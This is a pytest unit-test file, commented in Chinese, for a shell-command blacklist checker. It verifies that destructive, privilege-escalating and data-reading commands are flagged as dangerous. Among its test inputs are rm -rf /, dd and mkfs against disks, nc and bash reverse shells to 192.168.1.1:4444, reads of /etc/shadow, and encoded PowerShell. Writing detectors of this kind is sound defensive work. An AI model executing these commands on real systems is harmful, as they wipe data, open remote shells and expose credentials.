# Shell命令黑名单单元测试
# 编程人：小沈
# 创建时间：2026-02-17
# 更新时间：2026-02-18 - 扩展测试覆盖

"""
Shell命令黑名单安全检查服务单元测试
测试危险命令检测功能
"""

import pytest
from app.services.shell_security import (
    CommandSafetyChecker,
    check_command_safety,
    is_command_safe,
    get_command_risk_level,
    DANGEROUS_COMMANDS
)


class TestCommandSafetyChecker:
    """命令安全检查器测试"""
    
    @pytest.fixture
    def checker(self):
        """创建检查器实例"""
        return CommandSafetyChecker()
    
    # ========== 安全命令测试 ==========
    
    def test_safe_command_ls(self, checker):
        """测试安全命令: ls"""
        is_safe, reason = checker.check("ls -la")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_cd(self, checker):
        """测试安全命令: cd"""
        is_safe, reason = checker.check("cd /home/user")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_mkdir(self, checker):
        """测试安全命令: mkdir"""
        is_safe, reason = checker.check("mkdir new_folder")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_cat_file(self, checker):
        """测试安全命令: cat普通文件"""
        is_safe, reason = checker.check("cat /home/user/document.txt")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_cp(self, checker):
        """测试安全命令: cp复制"""
        is_safe, reason = checker.check("cp file1.txt file2.txt")
        assert is_safe is True
        assert reason == ""
    
    def test_safe_command_empty(self, checker):
        """测试空命令"""
        is_safe, reason = checker.check("")
        assert is_safe is True
        assert reason == ""
    
    # ========== 危险命令测试 - 系统破坏类 ==========
    
    def test_dangerous_rm_rf_root(self, checker):
        """测试危险命令: rm -rf /"""
        is_safe, reason = checker.check("rm -rf /")
        assert is_safe is False
        assert "rm -rf" in reason.lower() or "危险" in reason
    
    def test_dangerous_rm_rf_star(self, checker):
        """测试危险命令: rm -rf /*"""
        is_safe, reason = checker.check("rm -rf /*")
        assert is_safe is False
    
    def test_dangerous_format(self, checker):
        """测试危险命令: format"""
        is_safe, reason = checker.check("format c:")
        assert is_safe is False
        assert "format" in reason.lower() or "危险" in reason
    
    def test_dangerous_mkfs(self, checker):
        """测试危险命令: mkfs"""
        is_safe, reason = checker.check("mkfs.ext4 /dev/sda")
        assert is_safe is False
    
    def test_dangerous_dd(self, checker):
        """测试危险命令: dd写入设备"""
        is_safe, reason = checker.check("dd if=/dev/zero of=/dev/sda")
        assert is_safe is False
    
    # ========== 危险命令测试 - 权限提升类 ==========
    
    def test_dangerous_sudo(self, checker):
        """测试危险命令: sudo"""
        is_safe, reason = checker.check("sudo rm -rf /")
        assert is_safe is False
    
    def test_dangerous_su(self, checker):
        """测试危险命令: su"""
        is_safe, reason = checker.check("su - root")
        assert is_safe is False
    
    def test_dangerous_chmod_777_root(self, checker):
        """测试危险命令: chmod 777 /"""
        is_safe, reason = checker.check("chmod 777 /")
        assert is_safe is False
    
    # ========== 危险命令测试 - 网络攻击类 ==========
    
    def test_dangerous_nc_reverse_shell(self, checker):
        """测试危险命令: nc反向shell"""
        is_safe, reason = checker.check("nc -e /bin/bash 192.168.1.1 4444")
        assert is_safe is False
    
    def test_dangerous_bash_reverse_shell(self, checker):
        """测试危险命令: bash反向shell"""
        is_safe, reason = checker.check("bash -i >& /dev/tcp/192.168.1.1/4444 0>&1")
        assert is_safe is False
    
    # ========== 危险命令测试 - 数据泄露类 ==========
    
    def test_dangerous_cat_passwd(self, checker):
        """测试危险命令: 读取passwd"""
        is_safe, reason = checker.check("cat /etc/passwd")
        assert is_safe is False
    
    def test_dangerous_cat_shadow(self, checker):
        """测试危险命令: 读取shadow"""
        is_safe, reason = checker.check("cat /etc/shadow")
        assert is_safe is False
    
    # ========== 风险等级测试 ==========
    
    def test_risk_level_safe(self, checker):
        """测试安全命令风险等级"""
        level = checker.get_risk_level("ls -la")
        assert level == "safe"
    
    def test_risk_level_critical(self, checker):
        """测试高危命令风险等级"""
        level = checker.get_risk_level("rm -rf /")
        assert level == "critical"
    
    def test_risk_level_high(self, checker):
        """测试高风险命令风险等级"""
        level = checker.get_risk_level("sudo rm -rf /")
        assert level in ["high", "critical"]
    
    def test_risk_level_medium(self, checker):
        """测试中等风险命令风险等级"""
        level = checker.get_risk_level("cat /etc/passwd")
        assert level in ["medium", "high", "critical"]


class TestQuickFunctions:
    """快速函数测试"""
    
    def test_check_command_safety(self):
        """测试快速检查函数"""
        is_safe, reason = check_command_safety("ls")
        assert is_safe is True
    
    def test_is_command_safe(self):
        """测试快速安全判断"""
        assert is_command_safe("ls") is True
        assert is_command_safe("rm -rf /") is False
    
    def test_get_command_risk_level(self):
        """测试风险等级获取"""
        assert get_command_risk_level("ls") == "safe"
        assert get_command_risk_level("rm -rf /") == "critical"


class TestDangerousCommandsList:
    """危险命令列表测试"""
    
    def test_dangerous_commands_not_empty(self):
        """验证危险命令列表不为空"""
        assert len(DANGEROUS_COMMANDS) > 0
    
    def test_dangerous_commands_contains_rm_rf(self):
        """验证包含rm -rf"""
        assert any("rm -rf" in cmd for cmd in DANGEROUS_COMMANDS)
    
    def test_dangerous_commands_contains_format(self):
        """验证包含format"""
        assert any("format" in cmd for cmd in DANGEROUS_COMMANDS)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])


# ========== 扩展测试覆盖 - 2026-02-18 ==========

class TestEdgeCases:
    """边界情况测试 - 扩展覆盖"""
    
    @pytest.fixture
    def checker(self):
        return CommandSafetyChecker()
    
    def test_empty_command(self, checker):
        """测试空命令应安全"""
        is_safe, reason = checker.check("")
        assert is_safe is True
    
    def test_whitespace_only(self, checker):
        """测试仅空格"""
        is_safe, reason = checker.check("   ")
        assert is_safe is True
    
    def test_case_insensitive_rm(self, checker):
        """测试大小写不敏感 - RM"""
        is_safe, reason = checker.check("RM -RF /")
        assert is_safe is False
    
    def test_case_insensitive_sudo(self, checker):
        """测试大小写不敏感 - SUDO"""
        is_safe, reason = checker.check("SUDO SU")
        assert is_safe is False
    
    def test_multiple_spaces(self, checker):
        """测试多个空格"""
        is_safe, reason = checker.check("rm  -rf  /")
        assert is_safe is False
    
    def test_tab_separator(self, checker):
        """测试Tab分隔符"""
        is_safe, reason = checker.check("rm\t-rf\t/")
        assert is_safe is False
    
    def test_chained_commands_and(self, checker):
        """测试命令链 &&"""
        is_safe, reason = checker.check("ls && rm -rf /")
        assert is_safe is False
    
    def test_chained_commands_pipe(self, checker):
        """测试管道 |"""
        is_safe, reason = checker.check("cat file.txt | sh")
        # 这个应该是安全的因为cat是安全的
    
    def test_comment_injection(self, checker):
        """测试注释注入 - 实际应标记为不安全"""
        is_safe, reason = checker.check("ls # rm -rf /")
        # 实际行为：黑名单会检测到 rm -rf / 字符串，即使在注释中
        # 这是合理的安全策略，宁可误报也不漏报
        assert is_safe is False
    
    def test_windows_del_command(self, checker):
        """测试Windows删除命令"""
        is_safe, reason = checker.check("del /f /s /q C:\\Windows")
        assert is_safe is False
    
    def test_windows_format(self, checker):
        """测试Windows格式化"""
        is_safe, reason = checker.check("format D:")
        assert is_safe is False
    
    def test_windows_reg_command(self, checker):
        """测试Windows注册表"""
        is_safe, reason = checker.check("reg add HKLM\\Software")
        assert is_safe is False
    
    def test_powershell_encoded(self, checker):
        """测试PowerShell编码命令"""
        is_safe, reason = checker.check("powershell -enc YwBhAGwA")
        assert is_safe is False
    
    def test_reverse_shell_nc(self, checker):
        """测试NetCat反向Shell"""
        is_safe, reason = checker.check("nc -e /bin/bash 192.168.1.1 4444")
        assert is_safe is False
    
    def test_reverse_shell_bash_i(self, checker):
        """测试Bash交互式Shell"""
        is_safe, reason = checker.check("bash -i >& /dev/tcp/192.168.1.1/4444 0>&1")
        assert is_safe is False
